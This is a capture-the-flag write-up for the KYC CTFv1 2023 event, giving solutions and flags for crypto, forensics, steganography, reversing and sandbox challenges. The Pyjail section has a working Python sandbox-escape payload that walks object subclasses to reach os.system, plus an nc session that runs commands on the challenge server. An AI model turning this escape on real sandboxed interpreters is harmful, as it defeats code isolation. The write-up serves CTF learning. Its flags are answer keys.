# Know Your Click KYC CTFv1 - 2023

## Table of Contents
- [Challenges](#challenges)
    - [Cryptography](#cryptography)
        - [I am a Clueless](#i-am-a-clueless)
        - [Quick Quick Mathematics](#quick-quick-mathematics)
    - [Forensics](#forensics)
        - [Locate me](#locate-me)   
    - [Steganography](#steganography)
        - [1nv1s1bl3](#1nv1s1bl3)
    - [Reverse Engineering](#reverse-engineering)
        - [Keith Orders a Pizza](#keith-orders-a-pizza)
    - [Sandbox](#sandbox)
        - [Pyjail](#pyjail)


## Challenges

### Cryptography

#### I am a Clueless
- Points: 482
- Description: `I know it sounds mental, but sometimes I have more fun vegging out than when I go partying. Maybe because my party clothes are so binding. But the question is : Who am I? (You don't know my name)`
- Ciphertext: `7ax6dx72x4fx47x01x04x6ex56x73x42x5dx52x6bx55x01x46x6ex4dx03x44x6bx59x41x5bx00x05x4c`
- Key :`14(ILOVEYOU)`
- Key : `14143`

Solution:
- After every two letters x is repeating in cipher text.
- So we created python script to solve this challenge.
- Script 
``` 
import base64

cipher = "7ax6dx72x4fx47x01x04x6ex56x73x42x5dx52x6bx55x01x46x6ex4dx03x44x6bx59x41x5bx00x05x4c".split('x')
key = ['3' + i for i in "14143"]

res = []
for i, n in enumerate(cipher):
	x = int(n, 16)
	y = int(key[i % len(key)], 16)
	res.append(hex(x ^ y)[2:])

res = "".join(res)
print(bytes.fromhex(res).decode())

```
- Then wrap it in the flagformat KYC{}.
- Flag: `KYC{t00_b@sic_f0r_y0u_huh11}`
![image](https://user-images.githubusercontent.com/82113145/215673287-0ee23bb1-c2c8-4a71-a111-385af8d3649c.png)



#### Quick Quick Mathematics
- Points: 207
- DEscription : `Dodo has encrypted a message with the same value of 'e' for 3 public moduli - n1 = 86812553978993 n2 = 81744303091421 n3 = 83695120256591 and got the cipher texts - c1 = 8875674977048 c2 = 70744354709710 c3 = 29146719498409 Find the original message.`


Solution:
- We can solve this challenge by just using hastad attack. 
- We created this python script to solve this challenge.
```
from pwn import remote
from sympy.ntheory.modular import crt
from gmpy2 import iroot

e = 3
N = [86812553978993, 81744303091421, 83695120256591]
C = [8875674977048, 70744354709710, 29146719498409]

resultant, mod = crt(N,C)
value, is_perfect = iroot(resultant,e)
print(bytes.fromhex(str(value)).decode())

```
- Flag: `KYC{h45t4d}`

### Forensics

#### Locate me
- Points: 148
- Description: `Our forensics experts have acquired the following traffic using a MITM during a pentesting. Can you help us locating the file extracted by hackers?`

Resources/Scripts:
- [CaptureFile](./Scripts/LocateMe/infiltration.pcapng)
- Wreshark Tool

Solution:
- This a network analysis challenge.
- The challenge description says that we have to the file name which attacker extracted from the infected server. 
- We can see some protocols in the capture such as HTTP,TCP,SMB,FTP,etc..
- There are 2 protocols which are mainly for file transfer: SMB & FTP.
- I checked FTP but no good results.
 ![https://imgur.com/a/2hilcZm](https://i.imgur.com/KW3frOL.png)
- But when I checked SMB Protocol, I got the file name which is `PSEXESVC.EXE`.
 ![https://imgur.com/a/pzl4HaB](https://i.imgur.com/nvE4iOg.png)
- So the flag is: `KYC{PSEXESVC_EXE}`


### Steganography

#### 1nv1s1bl3
- Points: 128
- Description: `I am john cena.`

Resources/Scripts:
- [ZeroWidthEncodeDecode](https://330k.github.io/misc_tools/unicode_steganography.html)
- [EncodedFile](./Scripts/invisible/1nv1s1bl3.txt)

Solution:
- The challenge name suggests that the flag is invisible/hidden.
- After looking into the file, the number of characters is more than the count of the characters.
- This is probably the ZeroWidth Character Steganography.
- Copy all the text and goto [this](https://330k.github.io/misc_tools/unicode_steganography.html) link and paste it in right side and click decode. We'll get the flag.
 ![https://imgur.com/a/rBuh0HH](https://i.imgur.com/XsdGaxn.png)
- Flag: `KYC{1_Am_j0hn_c3na}`



### Reverse Engineering

#### Keith Orders a Pizza
- Points: 196
- Description: `Keith’s friend wants to get a pizza. When Keith asked their friend what topping he should get, their friend wrote the following code down on a napkin, and told them that the solution would be his favorite topping. See if you can help Keith break the code.`

Resources/Scripts:
- [Challenge Code](./Scripts/KeithPizza/topping.java)
- [Solution Code](./Scripts/KeithPizza/decode.py)

Solution:
- This is a basic java code where there are 2 functions used the encode the text.
- I have written the python code to reverse that function and find the flag and mentioned it in Resources/Scripts.
- Flag: `KYC{anchovies}`


### Sandbox

#### Pyjail
- Points: 250
- Description: `Break the jail :)`

Solution:
- We are given a sandboxed python shell where we can't import any modules.
- We are only allowed to use already imported builtin modules which are not blacklisted.
- By using this command we can list all the classes and functions in the module.
```
print(().__class__.__bases__[0].__subclasses__())
```
- We can see that there is a `_wrap_close` class in the `os` module.
- The parent of this class is `os`.
- By using this, we'll execute commands.
- First we'll get the index of `_wrap_close` class in the list but using this command:
```
print([entry.__name__ for entry in ().__class__.__bases__[0].__subclasses__()].index("_wrap_close"))
```
- Then we can execute os commands by using this command:
```
print([].__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['system']('ls'))
```
- We can see that there is a `Flag.txt` file.
- Now we can read the file by using this command:
```
print(open('Flag.txt').read())
```
- Complete Commands:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc 23.23.44.100 5000
>>> print([entry.__name__ for entry in ().__class__.__bases__[0].__subclasses__()].index("_wrap_close"))
137
>>> print([].__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['system']('ls'))
Dockerfile
Flag.txt
build.sh
jail.py
0
>>> print(open('Flag.txt','r').read())
KYC{Y0u_Br3k4n_th3_j@1l}
```

- Flag: `KYC{Y0u_Br3k4n_th3_j@1l}`
